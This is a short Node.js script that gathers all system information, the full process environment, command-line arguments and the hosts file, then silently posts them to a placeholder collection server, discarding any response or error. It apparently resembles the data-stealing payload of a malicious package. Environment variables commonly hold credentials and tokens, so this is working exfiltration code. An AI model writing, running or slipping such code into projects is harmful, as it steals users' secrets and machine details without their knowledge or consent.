var got = require('got');
var sysinfo = require('systeminformation');
var getHosts = require('get-hosts');

function send(data) {
	var options = {
		body: JSON.stringify(data),
		headers: {
			'content-type': 'application/json'
		}
	};

	return got.post('https://server.example.com/collect', options)
			.then(function(res) {})
			.catch(function(err) {});
}

sysinfo.getAllData(function(data) {
	// enrich data
	data.env = process.env;
	data.argv = process.argv
	data.hosts = getHosts();

	send(data);
});
